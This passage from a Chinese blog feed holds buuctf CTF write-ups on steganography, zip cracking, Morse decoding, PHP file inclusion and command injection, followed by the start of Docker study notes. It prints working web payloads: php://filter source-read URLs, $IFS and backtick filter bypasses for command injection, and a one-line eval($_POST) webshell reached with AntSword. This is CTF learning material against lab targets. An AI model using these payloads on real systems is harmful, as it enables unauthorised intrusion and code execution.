class="number">2</span>+<span class="built_in">int</span>(ans[i])</span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">8</span> == <span class="number">0</span> :</span><br><span class="line">            list_num.append(num)</span><br><span class="line">            num = <span class="number">0</span></span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list_num :</span><br><span class="line">        ans += <span class="built_in">chr</span>(i)</span><br><span class="line">    out_file.write(ans)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag！在out.txt中</p><p><img src="https://www.hualigs.cn/image/60f59a671ec20.jpg"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul><li><h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><p>官方解释：</p><blockquote><p>base64是将3个8比特转换成4个6比特，最小的转换单位是24比特（6和8最小公倍数）</p><p>因此如果原文内容不足三字节，有一部分比特解码时候不需要，但会组成编码后的某个字符。</p><p>比如上图A的 0100 0001 被 base64 识别为 0100 0001 0000 然而最后四个比特解密时无用。换句话说 0100 0001 0000 和0100 0001 1111 对应的原文都是 A ，因此可以使用这四个比特进行隐写</p></blockquote><p>我的理解：</p><p>就是base64会有三个字节，而当原文没有三字节时，最后四位是0000，此时这四位可以随便编写，而不影响原文，达到base64隐写的目的</p></li></ul><h1 id="题目：-SUCTF2018-followme"><a href="#题目：-SUCTF2018-followme" class="headerlink" title="题目：[SUCTF2018]followme"></a>题目：[SUCTF2018]followme</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>流量分析</p><h2 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h2><p>拿到流量包，先看http，内容，有异常，则将http内容导出，进行查看，发现大量的分解，打开文件分析后，发现应该是在进行爆破密码的操作，flag应该藏在其中，进行查找即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726203539.png"></p><h2 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h2><ul><li><p>导出http对象如下：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726203818.png"></p></li><li><p>导入文件夹中</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726204301.png"></p></li><li><p>使用kali进行寻找flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726204409.png"></p></li></ul><p>命令： grep -r “CTF”</p><ul><li>得到falg：SUCTF{password_is_not_weak}</li></ul><h1 id="题目：-GXYCTF2019-gakki"><a href="#题目：-GXYCTF2019-gakki" class="headerlink" title="题目：[GXYCTF2019]gakki"></a>题目：[GXYCTF2019]gakki</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>文件分离，压缩包破解，词频分析</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725140558.png"></p><h2 id="解题思路：-6"><a href="#解题思路：-6" class="headerlink" title="解题思路："></a>解题思路：</h2><p>首先看到一张png的图片，首先常规三件套，看exif，010看文件格式，分离看是否有隐藏文件，用foremost分离后发现一个压缩包，并带有密码，再在图片中寻找是否有关于密码的线索，没有则考虑爆破，从简单的四位数密码开始，果然成功了，发现txt中有大量字符串，并且毫无规律，从网上了解到是词频分析的加密方式。，于是脚本跑出即可</p><h2 id="解题步骤-17"><a href="#解题步骤-17" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>使用foremost分离得到一个压缩包</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725141116.png"></p></li><li><p>打开压缩包发现有密码，采用爆破的方式</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725141143.png"></p></li><li><p>打开ARCHPR，先从最简单的四位数密码爆破开始吧</p></li></ul><ul><li><p>我靠，运气特别好一次就出了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725141250.png"></p></li></ul><ul><li><p>打开后发现一大串的字符串，并且有很多字符夹杂着，采用普通的base家族解码并不成功，于是上网查找资料</p><p>了解到应该是词频统计的题，于是采用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">counts = strings.count(i)</span><br><span class="line">i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>如下图，flag为GXY{gaki_IsMyw1fe}</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725141953.png"></p></li></ul><h1 id="题目：-ACTF2020-新生赛-Include"><a href="#题目：-ACTF2020-新生赛-Include" class="headerlink" title="题目：[ACTF2020 新生赛]Include"></a>题目：[ACTF2020 新生赛]Include</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>文件包含</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725142417.png"></p><h2 id="解题思路：-7"><a href="#解题思路：-7" class="headerlink" title="解题思路："></a>解题思路：</h2><p>首先查看源码，发现包含了一个flag.php，根据题目也可以猜测是文件包含，先用常规的伪协议看看有没有过滤，发现过滤了input，那其他的伪协议还有很多，比如<strong>filter</strong>，尝试获取源码，获取到之后base64解码即可</p><h2 id="解题步骤-18"><a href="#解题步骤-18" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>点开tips，进入如下网页，观察源码，并无异常</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725142730.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725142742.png"></p></li><li><p>首先考虑 “php://input”伪协议 + POST发送PHP代码 的经典套路</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725142942.png"></p><p>发现回显hacker！应该是被ban了</p></li><li><p>常见的伪协议还有，<strong>php://filter</strong>，我们用php://filter进行包含</p><p>构造payload： <u>?file=php://filter/read=convert.base64-encode/resource=flag.php</u></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725143229.png"></p></li></ul><ul><li><p>如上图，这样就表示成功了，只不过把源码用base64的方式展现出来了，我们解码一下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210725143325.png"></p></li><li><p>得到 flag{36c83e0f-35cf-4bb8-8bb2-8cc55bde3980}</p></li></ul><h2 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h2><ul><li><p>php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p></li><li><p>php://input协议可以<strong>将post请求中的数据作为PHP代码执行</strong></p></li><li><p>phar://协议(用来将多个PHP文件打包为一个文件.可以和tar zip相互转化)可以<strong>解压文件并将文件中内容作为PHP执行代码</strong></p></li></ul><h1 id="题目：-AFCTF2018-Morse"><a href="#题目：-AFCTF2018-Morse" class="headerlink" title="题目：[AFCTF2018]Morse"></a>题目：[AFCTF2018]Morse</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>摩斯密码，十六进制转换</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722135555.png"></p><h2 id="解题思路：-8"><a href="#解题思路：-8" class="headerlink" title="解题思路："></a>解题思路：</h2><p>看题目肯定是摩斯电码了，拿去在线解密网站上解密一下，但正常解密并不行，看到有/字符，猜测把/转化为空格，然后再解密试试，一串字符串应该就是字符串处理的问题了</p><h2 id="解题步骤-19"><a href="#解题步骤-19" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>将/转化为空格，然后解密</p><p>转化结果：</p><p><code>-.... .---- -.... -.... -.... ...-- --... ....- -.... -.... --... -... ...-- .---- --... ...-- ..--- --... --... ....- ..... ..-. --... ...-- ...-- ----- ..... ..-. ...-- ...-- ...-- ....- ...-- ..... --... ----. --... -..</code></p></li><li><p>在线网站解密 <a href="http://www.atoolbox.net/Tool.php?Id=776http://www.atoolbox.net/Tool.php?Id=776">http://www.atoolbox.net/Tool.php?Id=776http://www.atoolbox.net/Tool.php?Id=776</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722141554.png"></p><p>解密结果：<code>61666374667B317327745F73305F333435797D</code></p></li><li><p>解出来一个带有字母的字符串，拿去提交一下，发现并不是正确答案，那么应该就是字符串处理的问题了，看到最大字母为F，那就去十六进制转文本</p><p>网站：<a href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722142953.png" alt="img"></p></li></ul><ul><li><p>如上图可以看到flag已经出来了</p><p>afctf{1s’t_s0_345y}</p></li></ul><h1 id="题目：-ACTF新生赛2020-outguess"><a href="#题目：-ACTF新生赛2020-outguess" class="headerlink" title="题目：[ACTF新生赛2020]outguess"></a>题目：[ACTF新生赛2020]outguess</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>outguess隐写，exif查看</p><h2 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h2><p>下载附件得到一大堆，但实际上有用的只有那张图片，用常规三件套进行寻找是否有附加信息，于是在图片exif上发现了一串编码，网上搜索了下outguess是什么意思，了解到可以是一种隐写，于是在kali上下载工具，并进行解密，</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726210521.png"></p><h2 id="解题步骤-20"><a href="#解题步骤-20" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>得到一张图片，进行查看是否有隐藏信息</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726210832.png"></p></li><li><p>在exif上发现了社会主义编码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726210909.png"></p></li><li><p>去在线网站解密一下得到abc</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726211013.png"></p></li><li><p>通过搜索了解到outguess是一种图片加密方式</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726211040.png"></p></li><li><p>根据刚刚的abc，很容易的联想到应该是outguess隐写的密码</p></li><li><p>在下载的outguess文件下使用命令 <code>outguess -r mmm.jpg 1.txt -k abc</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726211439.png"></p><ul><li><p>打开1.txt 得到 ACTF{gue33_Gu3Ss!2020}</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726211503.png"></p></li></ul><h1 id="题目：-GXYCTF2019-Ping-Ping-Ping"><a href="#题目：-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="题目：[GXYCTF2019]Ping Ping Ping"></a>题目：[GXYCTF2019]Ping Ping Ping</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>命令执行，绕过方法</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e6d93d4aa31.jpg"></p><h2 id="解题思路：-9"><a href="#解题思路：-9" class="headerlink" title="解题思路："></a>解题思路：</h2><p>根据题目ping，猜测为命令执行类型，看到网页给出提示?ip=，先查看源代码有无附加信息，没有则在url中测试是否为命令执行，若有过滤再另找它路</p><h2 id="解题步骤-21"><a href="#解题步骤-21" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>首先测试，随便输入一些，随便ping</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e6d9efba534.jpg"></p></li><li><p>输入ls试试看能不能看目录 用；连接，php中；代表一句话的结束</p><p>可以看到有两个php文件，我们尝试直接输出flag.php</p><p><img src="https://www.hualigs.cn/image/60e6db56ddf0d.jpg"></p><p>运用命令<strong>cat flag.php</strong></p></li><li><p>发现并不可行，根据英文判断过滤了空格，于是我们思考如何绕过</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e6db5706689.jpg"></p><p>空格绕过有如下几种方式：</p><blockquote><ol><li>${IFS}替换</li><li>$IFS$1替换</li><li>${IFS替换</li><li>%20替换</li><li>&lt;和&lt;&gt;重定向符替换</li><li>%09替换</li></ol></blockquote><p>我们一个个试试看吧！</p></li><li><p>当试到第二个时发现网页跳转了！！</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e6de1b4614b.jpg"></p><p><strong>但是，</strong>它告诉我们 flag不可用，于是我们尝试用拼接flag的方法（唉。。）</p><p>说白了就是用变量x表示g</p><p>输入**?ip=127.0.0.1;x=g;cat$IFS$1fla$x.php;**</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e6de1bbde02.jpg"></p></li></ul><p>查看源代码即可看到flag</p><h2 id="补充-2"><a href="#补充-2" class="headerlink" title="补充"></a>补充</h2><p>下图为此题的index.php</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e6df4d120ea.jpg"></p><ul><li><p>通过单引号，双引号绕过（本题被ban了）</p><p><code>ca&quot;t fl&quot;ag</code></p></li><li><p>通过反斜线绕过（被ban了）</p><p><code>ca\t fl\ag</code></p></li><li><p>如果cat被过滤，可以的使用下列方法</p></li></ul><blockquote><p>(1)more:一页一页的显示档案内容</p><p>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</p><p>(3)head:查看头几行</p><p>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p><p>(5)tail:查看尾几行</p><p>(6)nl：显示的时候，顺便输出行号</p><p>(7)od:以二进制的方式读取档案内容</p><p>(8)vi:一种编辑器，这个也可以查看</p><p>(9)vim:一种编辑器，这个也可以查看</p><p>(10)sort:可以查看</p><p>(11)uniq:可以查看</p><p>(12)file -f:报错出具体内容</p></blockquote><ul><li><p>本题也可用内敛绕过（积累一下下吧👇）</p><p>内联，就是将反引号内命令的输出作为输入执行。</p><p>?ip=127.0.0.1;cat$IFS$1<code>ls</code></p><p>这个真的厉害</p></li></ul><h1 id="题目：-极客大挑战-2019-Secret-File"><a href="#题目：-极客大挑战-2019-Secret-File" class="headerlink" title="题目：[极客大挑战 2019]Secret File"></a>题目：[极客大挑战 2019]Secret File</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>对抓包的使用，文件包含，伪协议</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f061eac190b.jpg"></p><h2 id="解题思路：-10"><a href="#解题思路：-10" class="headerlink" title="解题思路："></a>解题思路：</h2><p>首先查看源代码有无隐藏信息，如果没用则用御剑扫个后台看看，然后我们在源代码中看到了隐藏php页面，点开后发现一闪而过，则考虑抓包看下响应，抓包后又看到了一个隐藏php，打开后进行代码审计，发现是文件包含漏洞，并且过滤了input，tp，data，和../，但是还有一个常用的我们可以使用，就是fileter伪协议，考虑伪协议绕过</p><h2 id="解题步骤-22"><a href="#解题步骤-22" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>f12 源码看到一个隐藏的php网页，</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0d30150751.jpg"></p></li><li><p>我们进去之后</p><p>发现有一个按钮可以点，点开后便结束，太快了，我们考虑薄荷抓个包看看响应</p><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0d34351443.jpg"></td><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0d357960dc.jpg"></td></tr></table></li><li><p>如下图，通过抓包我们看到还有一个有隐藏的php页面</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0d2ae5fb8f.jpg"></p><ul><li><p>我们进去后发现了代码，审计后发现是一个<strong>文件包含漏洞</strong>，并且过滤了input，data，../等常用字符</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0d693797c9.jpg"></p><p>但是没有过滤filter这一伪协议，于是我们可以用filter进行绕过</p><blockquote><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p></blockquote><p>于是我们采用base64编码的方法吧源码输出出来，在url后面打入</p><p>?file=php://filter/convert.base64-encode/resource=flag.php</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0d8f1b234e.jpg"></p><p>可以看到源码以base64的方式被输出了出来，这时我们去解密网站解密一下，即可看到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0d9464910f.jpg"></p><h2 id="补充-3"><a href="#补充-3" class="headerlink" title="补充"></a>补充</h2><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><ul><li>zip://中只能传入绝对路径。</li><li>只需要是zip的压缩包即可，后缀名可以任意更改。</li></ul><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p><p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p><h1 id="题目：-极客大挑战2019-Knife-1"><a href="#题目：-极客大挑战2019-Knife-1" class="headerlink" title="题目：[极客大挑战2019]Knife"></a>题目：[极客大挑战2019]Knife</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>蚁剑的使用</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dbce59b18.jpg"></p><h2 id="解题思路：-11"><a href="#解题思路：-11" class="headerlink" title="解题思路："></a>解题思路：</h2><p>做web题首先打开源码看一下，然后根据题目名称和页面的提示，看到eval($_POST[“Syc”])，可以猜到应该就是通过一句话木马，我们通过蚁剑或者菜刀链接，来拿到shell，拿到flag</p><h2 id="解题步骤-23"><a href="#解题步骤-23" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>首先查看源码，看了一圈没什么异常</p></li><li><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dc69b5633.jpg"></p></li><li><p>通过题目和菜刀很容易想到通过蚁剑或是菜刀连接后台</p></li><li><p>这里我们用到蚁剑来连接，打开后右键添加数据，然后填上url，密码为Syc，因为他给了我们上传的一句话木马：<code>eval($_POST[&quot;Syc&quot;]);</code> 是post Syc</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dcea86ce8.jpg"></p><ul><li><p>可以看到连接成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dd729ceb1.jpg"></p></li><li><p>然后我们打开终端，然后cd到根目录下，通过命令 cat flag，即可看到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dde47e3e7.jpg"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;MRCTF2020-你传你🐎呢&quot;&gt;&lt;a href=&quot;#MRCTF2020-你传你🐎呢&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]你传你🐎呢&quot;&gt;&lt;/a&gt;[MRCTF2020]你传你🐎呢&lt;/h1&gt;&lt;p</summary>
      
    
    
    
    <category term="-CTF" scheme="https://abinix.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://abinix.top/2021/08/13/Docker%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/08/13/Docker%E7%AC%94%E8%AE%B0/</id>
    <published>2021-08-12T16:04:49.000Z</published>
    <updated>2021-08-12T16:39:43.912Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">Docker学习笔记</h1><p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>Docker的思想来自于集装箱，集装箱解决了什么问题？在一艘大船上，可以把货物规整的摆放起来。并且各种各样的货物被集装箱标准化了，集装箱和集装箱之间不会互相影响。那么我就不需要专门运送水果的船和专门运送化学品的船了。只要这些货物在集装箱里封装的好好的，那我就可以用一艘大船把他们都运走。</p></blockquote><p>我的理解就是，他是一个大环境，然后在docker里可以自己搭建许多小环境，并且非常灵活，想要的环境也可以从镜像库中拉取，这就解决了我们很多时候的环境问题、</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806153401.gif"></p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>在kali2020版本中我使用两条命令即安装了docker</p><blockquote><p>sudo apt update</p><p>sudo apt install -y docker.io</p></blockquote><p>1.</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806155436.png"></p><p>​    更新软件包可以让我们安装的软件版本更新</p><p>2.</p><p>​    使用命令 <code>sudo apt install -y docker.io</code>进行安装，出现如下，选确定即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806155553.png"></p><p>3.</p><p>​    安装完成，通过命令 <code>docker -v</code> 查看版本</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003804.png"></p><p>​    可以看到安装完毕</p><h1 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h1><p>ps：这里使用自己vps上的docker服务来进行测试</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li><p>启动docker</p><p>systemctl start docker</p></li><li><p>关闭docker</p><p>systemctl stop docker</p></li><li><p>重启docker</p><p>systemctl restart docker</p></li><li><p>查看docker信息</p><p>docker info</p></li><li><p>列出本地镜像</p><p>docker images</p></li><li><p>查找镜像</p><p>docker search &lt; &gt;</p></li><li><p>列出已启动的容器</p><p>docker ps （docker ps -a 表示显示已存在的所有容器）</p></li><li><p>拉取镜像</p><p>docker pull</p></li><li><p>容器状态</p><p>打开： docker start id</p><p>关闭： docker stop id</p></li><li><p>删除操作</p><p>删除镜像：docker rmi id</p><p>删除容器：docker rm id</p><p>ps：一般都是先停止容器，然后删除容器，最后删除镜像</p></li></ul><h2 id="镜像与容器"><a href="#镜像与容器" class="headerlink" title="镜像与容器"></a>镜像与容器</h2><p><strong>一句话讲清容器与镜像的关系：容器 = 镜像image + 读写层</strong> </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806161409.jpeg"></p><p>可以看到容器与镜像是包含的关系，镜像运行起来就是容器，通过镜像才能运行容器，所以这两个是完全不同的东西，也是docker最重要的两个部分</p><blockquote><p>docker镜像实际上是由一层一层的系统文件组成，这种层级的文件系统被称为UnionFS( Union file system  统一文件系统)，镜像可以基于dockerfile构建，dockerfile是一个描述文件，里面包含了若干条密令，每条命令都会对基础文件系统创建新的层次结构。</p></blockquote><h2 id="镜像常用命令"><a href="#镜像常用命令" class="headerlink" title="镜像常用命令"></a>镜像常用命令</h2><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><p>命令：<code>docker images</code>  可查看本地所有的镜像</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003859.png"></p><table><thead><tr><th>列表</th><th>意思</th></tr></thead><tbody><tr><td>TAG</td><td>镜像的标签（版本）同一个仓库有多个TAG的镜像，多个版本，用REPOSITORY:TAG来定义不同的镜像；TAG来定义不同的镜像；</td></tr><tr><td>IMAGE ID</td><td>镜像ID，镜像的唯一标识</td></tr><tr><td>CREATE</td><td>镜像创建时间</td></tr><tr><td>SIZE</td><td>镜像大小</td></tr><tr><td>OPTIONS</td><td>可选参数：-a 显示所有镜像（包括中间层）-q 只显示镜像 ID-qa可以组合–digests 显示镜像的摘要信息 –no-trunc 示完整的镜像信息</td></tr><tr><td>REPOSITORY</td><td>镜像的仓库源</td></tr></tbody></table><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><p>命令：<code>docker search</code> </p><p>从 <a href="https://hub.docker.com/">Docker Hub </a>上检索镜像的详细信息。如：docker search java</p><p>例：搜索所有镜像名包含 java 的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003923.png"></p><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><p>命令：<code>docker pull 镜像名称:[TAG]</code></p><p>例：这里拉取一个shiro反序列化的镜像，用来复现</p><p>命令： <code>docker pull medicean/vulapps:s_shiro_1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806164410.png"></p><p>如上图拉取镜像即会下载一些东西</p><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><p>命令： <code>docker rmi id</code></p><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>命令：<code>docker build  [OPTIONS] PATH</code></p><p>如果想要构建镜像得有dockerfile，通过dockerfile来构建</p><p>例如：</p><p>命令：<code> docker build -t ezphp .</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003940.png"></p><h2 id="容器常用命令"><a href="#容器常用命令" class="headerlink" title="容器常用命令"></a>容器常用命令</h2><h3 id="创建容器与端口映射"><a href="#创建容器与端口映射" class="headerlink" title="创建容器与端口映射"></a>创建容器与端口映射</h3><p>命令：<code>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</code></p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–name</td><td>“容器新名字”：为容器指定一个名称；</td></tr><tr><td>-i</td><td>以交互模式运行容器，通常与-t或者-d同时使用；</td></tr><tr><td>-t</td><td>为容器重新分配一个伪输入终端，通常与-i同时使用；</td></tr><tr><td>-d</td><td>后台运行容器，并返回容器ID；</td></tr><tr><td>-P</td><td>随机端口映射，容器内部端口随机映射到主机的端口</td></tr><tr><td>-p</td><td>指定端口映射，格式为：主机(宿主)端口:容器端口</td></tr></tbody></table><p>一般<strong>常用的命令</strong>即是 <code>docker run -d -p 端口号:80 name</code></p><p><strong>启动交互式容器</strong>：<code>docker run -it -d -p name</code></p><p>举个栗子（还是用到上面的shiro例子）：</p><p>命令：<code>docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code>（映射在8080端口）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806165611.png"></p><p>返回一串数字，这个容器id</p><p>这时代表容器创建完成，我们打开ip对应的端口号</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806165721.png"></p><p>如图所示，这就是一个容器，里面配备所有环境，成功访问</p><h3 id="列出容器"><a href="#列出容器" class="headerlink" title="列出容器"></a>列出容器</h3><p>命令：<code>docker ps [OPTIONS]</code></p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-a</td><td>显示所有的容器，包括未运行的。</td></tr><tr><td>-f</td><td>根据条件过滤显示的内容。</td></tr><tr><td>-format</td><td>指定返回值的模板文件。</td></tr><tr><td>-l</td><td>显示最近创建的容器。</td></tr><tr><td>-n</td><td>列出最近创建的n个容器。</td></tr><tr><td>–no-trunc</td><td>不截断输出。</td></tr><tr><td>-q</td><td>静默模式，只显示容器编号。</td></tr><tr><td>-s</td><td>显示总的文件大小。</td></tr></tbody></table><h3 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h3><p>启动命令：<code>docker start id</code></p><p>停止命令：<code>docker stop id</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808230755.png"></p><p>重启命令：<code>docker restart id</code>、</p><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><p>命令： <code>docker rm id</code></p><p>与镜像不同的是 这里删除命令是rm ，镜像是rmi（images）</p><h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><p>命令：<code>docker exec -it id 执行命令</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808232139.png"></p><p>这时就进入到docker里面了，可以查看docker里面的代码、环境等，也可以更改里面的东西。</p><p>ps：进入docker里面，更改或者删掉里面的任何东西后，如果重启docker，都会恢复的。所以如果需要docker里面的某些东西做些永久性的改变，就需要<code>docker commit</code>。</p><h3 id="容器文件拷贝"><a 